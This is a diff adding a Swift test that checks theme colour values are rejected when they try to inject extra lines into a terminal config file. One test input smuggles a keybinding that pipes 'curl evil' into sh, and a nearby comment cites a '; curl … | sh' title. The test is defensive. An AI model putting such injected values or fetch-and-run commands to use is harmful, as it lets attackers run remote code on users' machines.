@@ -116,6 +116,13 @@ import PDFKit
     #expect(try await rig.app.get(SessionList()).count == 1)
 }
 
+/// A theme's colours are written into the terminal's config file: one can't add a line there.
+@MainActor @Test func aThemeColourIsOneWord() {
+    #expect(Theme.terminalColor("#1e1e2e") == "#1e1e2e" && Theme.terminalColor("black") == "black")
+    #expect(Theme.terminalColor("#000\nkeybind = super+v=text:curl evil|sh\\n") == nil)
+    #expect(Theme.terminalColor("#000\n") == nil && Theme.terminalColor("a = b") == nil && Theme.terminalColor(nil) == nil)
+}
+
 /// An extension's own terminal: or agent: template takes an item's values as its other actions do: in a command as
 /// shell variables (a title's `; curl … | sh` runs nothing), in a prompt typed for the user to send, never in a tmux name.
 @MainActor @Test func anExtensionsRunTemplateKeepsValuesAsData() {
